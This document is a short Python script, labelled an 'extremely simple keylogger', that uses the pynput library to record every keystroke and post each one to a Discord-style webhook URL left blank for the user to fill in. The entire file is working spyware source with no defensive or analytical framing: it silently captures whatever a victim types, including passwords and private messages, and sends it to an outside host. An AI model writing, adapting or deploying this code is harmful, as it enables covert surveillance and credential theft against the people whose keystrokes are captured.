#extremely simple keylogger

import requests
import threading
import time
from pynput.keyboard import \
    Listener

#your webhook
WEBHOOK_URL = ''




def capture(key):
    key_str = str(key)
    payload = {'content': key_str}
    #send keys to webhook
    requests.post(WEBHOOK_URL, json=payload)
    print(key_str)

def capture_keys():
    #listen for keystrokes
    with Listener(on_press=capture) as listener:
        listener.join()

capture_keys()

#keep script alive
while True:
    time.sleep(1)